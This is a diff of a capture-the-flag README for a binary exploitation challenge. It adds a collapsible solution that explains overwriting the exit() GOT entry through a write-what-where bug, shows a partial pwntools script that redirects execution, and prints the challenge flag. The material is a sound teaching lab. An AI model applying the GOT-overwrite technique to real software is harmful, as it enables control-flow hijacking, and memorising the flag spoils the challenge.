@@ -1,16 +1,27 @@
 # GameOfThrones
 
-### 📍 Description
+### 📄 Description
 
 Can you write a decent finale for Game of Thrones and get the flag?
 
-### 📄 Rules
+### ⚙ How to run
+```bash
+./vuln
+```
+
+
+### ⛔ Rules
 - You cannot patch this binary.
 - The challenge MUST BE SOLVED by providing appropriate inputs.
 - Solutions that jump directly to the print flag function WILL NOT BE CONSIDERED.
-- Do not modify the flag.txt file.
+- Do not modify the `flag.txt` file.
 
-## 🔑 Solution
+
+<details>
+    <summary>
+        <h2>🔑 Solution</h2>
+    </summary>
+
 
 The binary provides a trivial write-what-where so it would be a good idea to overwrite some entry in the GOT in order to get control of the program control flow.
 A good candidate for the overwrite would be (as usual) the `exit()` function.
@@ -28,8 +39,9 @@ p.sendline(str(e.functions["show_true_ending"].address).encode("ascii"))
 log.success(p.recvline_regex(rb"SPRITZ{.*}").decode("ascii"))
 ```
 
-### 🚩 Flag
+<h3> 🚩 Flag </h3>
 
 ```plain
 SPRITZ{GoT_Hijacking_iS_FUn{flag}}
 ```
+</details>
